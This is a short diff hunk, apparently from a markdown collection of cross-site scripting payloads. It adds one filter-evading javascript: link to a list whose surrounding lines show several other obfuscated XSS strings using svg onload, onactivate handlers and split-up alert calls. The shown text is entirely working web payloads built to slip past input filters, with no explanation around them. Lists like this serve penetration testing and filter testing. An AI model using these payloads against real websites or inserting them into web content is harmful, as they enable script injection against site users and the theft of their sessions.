@@ -152,6 +152,7 @@ xss><svg/onload=globalThis[`al`+/ert/.source]`1`//
 "-top['al\x65rt']('sailay')-"
 <div onactivate=alert('Xss') id=xss style=overflow:scroll> 
 ><div onactivate=alert('Xss')> 
+<a href="javas%09cript:[1].map(top['ale'+'rt'])">
 ```
 
 ## XSS + SSRF <br>
